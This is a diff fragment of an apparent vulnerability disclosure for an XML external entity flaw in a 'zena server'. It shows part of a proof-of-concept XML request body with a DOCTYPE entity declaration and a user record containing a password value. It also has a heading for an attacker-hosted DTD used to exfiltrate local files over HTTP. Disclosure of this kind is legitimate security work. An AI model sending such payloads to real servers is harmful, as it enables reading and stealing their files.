@@ -44,6 +44,7 @@ XML import data to contain external entity values that can induce the server to 
 functions it was not intended to do. Ex. Reading a local file and exfiltrating it over an HTTP
 request back to the attacker
 Poc code - Request body to zena server:
+
 ```<?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
@@ -60,6 +61,7 @@ UID="A2A9235502DE"><![CDATA[<USER NAME="research"
 PASSWORD="3jkY15nHscTNeexdKq+gVqiMsh1ngexPj4of7xliF3uDjnkTkJw7qq78ruSMvOGat"
 UID="A2A9235502DE" LOGIN="research" DOMAIN="EC2AMAZ-57EH5UL" ALLRIGHTS="YES"
 ALLAGENTS="YES"><DESCRIPTION></DESCRIPTION><ROLES/></USER>]]></USER></USERS></PACKAGE>```
+
 
 External DTD code hosted on attacker server as xxe.dtd:
 
